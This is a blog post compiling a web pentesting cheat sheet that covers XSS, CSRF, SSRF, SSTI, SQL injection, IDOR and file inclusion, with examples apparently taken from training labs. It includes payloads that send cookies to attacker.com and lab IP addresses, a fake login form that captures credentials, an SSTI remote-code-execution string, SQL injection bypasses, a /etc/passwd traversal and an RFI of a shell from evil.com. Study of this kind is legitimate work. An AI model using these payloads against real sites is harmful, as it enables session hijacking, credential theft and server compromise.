---
layout: post
title: Web Hacking Vulnerabilities & Exploits
image: /assets/images/test2.png
date: 15-01-2025
categories: [Pentesting & Techniques]
tag: [cheat sheet, vulnerabilities, web security]
excerpt: "This document is a work-in-progress where I’m compiling a variety of common web vulnerabilities and exploitation techniques. It will be updated over time with additional insights and methodologies as I continue refining my approach."
---
![img-description](/assets/images/test2.png)

This document is a work-in-progress where I’m compiling a variety of common web vulnerabilities and exploitation techniques. It will be updated over time with additional insights and methodologies as I continue refining my approach.
<p style="font-size:2em; font-weight:bold; margin-bottom: 0;">COMMON VULNERABILITIES</p>
<hr>


## CROSS SITE SCRIPTING (XSS)
---
Cross-Site Scripting (XSS) is a web vulnerability that allows an attacker to inject malicious JavaScript into a web application. Since JavaScript runs on the client side, this can lead to session hijacking, credential theft, defacement, or other attacks against users interacting with the compromised website. XSS exploits occur when an application fails to properly sanitize user input before rendering it in the browser.
Automated tool https://github.com/s0md3v/XSStrike
There are several types of XSS, including:

### Reflected XSS  
---
The malicious script is included in a request (e.g., a URL) and reflected in the response without proper sanitization.

Example:
````javascript
{% raw %}
https://victim.com/search?q=<script>alert('XSS')</script>
<script>document.body.background+%3d+"http:10.8.25.149/Untilted.jpeg"</script>
<script>document.write(`<h3>Please login to continue</h3><form action="http://10.23.17.164"><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>`);</script></h3> # make a fake login
<img src=x onerror=this.src="http://10.10.14.12:8000/"+btoa(document.cookie)> # Get the cookies 
{% endraw %}
````
If the website includes q directly in the response, the script executes in the victim’s browser.

### Stored XSS
---
The payload is stored permanently in the web application (e.g., in a database) and executed whenever users load the affected page.
Example: An attacker injects `<script>document.cookie</script>`into a comment section. 
Every user who views the comment executes the script unknowingly.

````bash
POST /basket HTTP/1.1
Host: nahamstore.thm
User-Agent: <script>alert(1)</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://nahamstore.thm
Connection: keep-alive
Referer: http://nahamstore.thm/basket
Cookie: session=aa430cef8b8c5ea21400d1ee0be628fa; token=7d85504e8119926564e8a77ee4243519
Upgrade-Insecure-Requests: 1
Priority: u=0, i

address_id=5&card_no=1234123412341234
````

### Blind XSS 
---
Similar to stored XSS, but the payload is triggered in an admin or back-end interface where the attacker doesn’t see the result directly.

Example:

````javascript
<script>fetch('http://attacker.com/steal?data='+document.cookie)</script> in a feedback form, which is later viewed by an admin.
````

### DOM-Based XSS  
---
The vulnerability exists in the JavaScript code of the web page itself, where user input is improperly handled by the DOM.
````javascript
var user = window.location.hash.substring(1);
document.write(user);
https://victim.com/#<script>alert('XSS')</script>, the script executes.
 ````

Each type of XSS exploits improper handling of user input and can lead to severe security issues if not mitigated properly.

## CROSS SITE REQUEST FORGERY (CSRF)
---
CSRF is a vulnerability where an attacker tricks a user into performing unwanted actions on a web applicaction in which they aare already authenticated. The attack exploits the trust the application has in the user's browser by sending malicious request from third-party site. For example:

* Bank Transfer: If a user is logged into their online banking, an attacker could embed a hidden form on a malcious site that sends a request to transfer money to the ataccker's account. When the user visits the site, the request is sent automatically using the user's session.
* Password Change. An attacker could craft a link or form that changes the user's password on a vulnerable site. If the user click the link while logged in, their password is changed without their knowledge

````bash
GET /change_pass.php?password=prueba123&confirm_password=prueba123&submit=submit HTTP/1.1
````

We can also chain an XSS with a CSRF to get the password change

````javascript
<script>
  fetch('https://vulnerable-site.com/change-password', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'new_password=attacker_password&confirm_password=attacker_password'
  });
</script>
````

## SERVER-SIDE REQUEST FORGERY (SSRF)
---
Server-side request forgery is a web security vulnerability that allows an attack to cause the sever-side applicaction to make requests to an unintended location

Usually the attacker might cause the sever to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connecto to arbitrary external system. This could end in leaking sensitive data.

### Example
---
We got this Post which make a post into stock Api
````bash
POST /product/stock HTTP/2
Host: 0a4a001e035443fd813d61f800b80034.web-security-academy.net
Cookie: session=M19m7fx9TxnKAqPNUpHjpf1zX1XAoogy
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4a001e035443fd813d61f800b80034.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Origin: https://0a4a001e035443fd813d61f800b80034.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
# In this case we may change the parameters of stockApi to get acces into the interanl sever
stockApi=http://localhost/admin
# We can even acces to an internal network
stockApi=http://192.168.0.1:8080/admin
````

## SERVER SITE TEMPLATE INJECTION (SSTI)
---
Server-Side Template Injection (SSTI) is a vulnerability that occurs when user input is unsafely processed by a web application's template engine. If an attacker can inject malicious template expressions, they may achieve **Remote Code Execution (RCE)** or access sensitive data.

This vulnerability is commonly found in web frameworks using template engines like:

- **Jinja2 (Python)**
- **Twig (PHP)**
- **Freemarker (Java)**
- **Velocity (Java)**
- **Smarty (PHP)**
- **Django Template (Python)**

**Example: Vulnerable Code (Jinja2 - Python)**

````python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/ssti')
def ssti():
    user_input = request.args.get("name")
    return render_template_string("Hello " + user_input)

````

If a user requests

```javascript
{% raw %}
http://example.com/ssti?name={{7*7}}
{% endraw %}
```

The page would return `hello 49`

**Exploiting SSTI for RCE (Jinja2 Example)**

Once SSTI is confirmed, an attacker can escalate it to **Remote Code Execution** using Python’s built-in functions:

```javascript
{% raw %}
http://example.com/ssti?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{% endraw %}
```

You can acces to a cheatsheet with types of SSTI and bypasss <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank">here</a>

## SQL INJECTION
---

**SQL Injection (SQLi)** is a type of security vulnerability that occurs when an attacker is able to manipulate an SQL query by injecting malicious SQL code into an input field. This can allow the attacker to gain unauthorized access to a database, retrieve sensitive information, modify data, or even execute administrative operations on the database.

SQLi typically happens when user inputs are not properly sanitized or validated before being included in SQL queries. This vulnerability is common in web applications that interact with databases.

Typical commands for bypassing

````sql
' OR '1'='1
' or 1=1 limit 1 --
1' UNION SELECT username, password FROM users --
````

More info and payloads <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank">here</a>

## INSECURE DIRECT OBJECT REFERENCE (IDOR)
---
**IDOR (Insecure Direct Object Reference)** is a security vulnerability that occurs when an application exposes a reference to an internal object (e.g., a file, database record, or resource) without proper authorization checks. Attackers can manipulate these references to access unauthorized data or perform actions they shouldn't be allowed to.

This vulnerability typically arises when developers trust user-supplied input (e.g., IDs in URLs or parameters) without verifying if the user has permission to access the requested resource.

**Examples of IDOR**

### Accesing Unauthorized User Data
---
````bash
https://example.com/profile?user_id=123
https://example.com/profile?user_id=124
We can modify the parameter of user_id to acces to user's profile
````

### Downloading Unauthorized Files
---
Imagine a file-sharing application that allows users to download files using a URL like this:

````bash
https://example.com/download?file_id=567
````

If the application does not verify whether the user has permission to access `file_id=567`, an attacker could manipulate the `file_id` parameter to download other files:

````bash
https://example.com/download?file_id=568
````

This could lead to unauthorized access to confidential or restricted files.


## LOCAL FILE INCLUSION (LFI) & REMOTE FILE INCLUSION (RFI)
---
### Local File Inclusion (LFI)
---
LFI is a web vulnerability that allows an attacker to include files from the local server in a web application. This happens when user input is not properly validated before being used in file-handling functions, such as `include()`, `require()`, `fopen()`, or `file_get_contents()` in PHP.

 **How It Works**

If a web application dynamically loads a file based on user input like this:

````php
<?php
    $file = $_GET['page'];
    include("pages/" . $file);
?>

````

An attacker could manipulate the `page` parameter to read sensitive files:

````bash
http://example.com/index.php?page=../../../../etc/passwd
````

### Remote File Inclusion (RFI)
---
RFI is a more severe vulnerability where an attacker includes a remote file (e.g., from an external server) in a web application, leading to code execution. This happens when external URLs are allowed in file inclusion functions.

 **How It Works**

If an application allows remote file inclusion like this:

````php
<?php
    include($_GET['file']);
?>
````

An attacker could inject a malicious script:

````bash
http://example.com/index.php?file=http://evil.com/shell.php
````

### **LFI vs RFI – Key Differences**

| Feature          | LFI (Local File Inclusion)                   | RFI (Remote File Inclusion)          |
| ---------------- | -------------------------------------------- | ------------------------------------ |
| **Source**       | Local files on the server                    | Remote files from an external source |
| **Impact**       | Information disclosure, local code execution | Full remote code execution           |
| **Requirements** | The file must exist on the server            | `allow_url_include` must be enabled  |
| **Severity**     | High                                         | Critical                             |

![netrunner](/assets/images/netrunner.gif)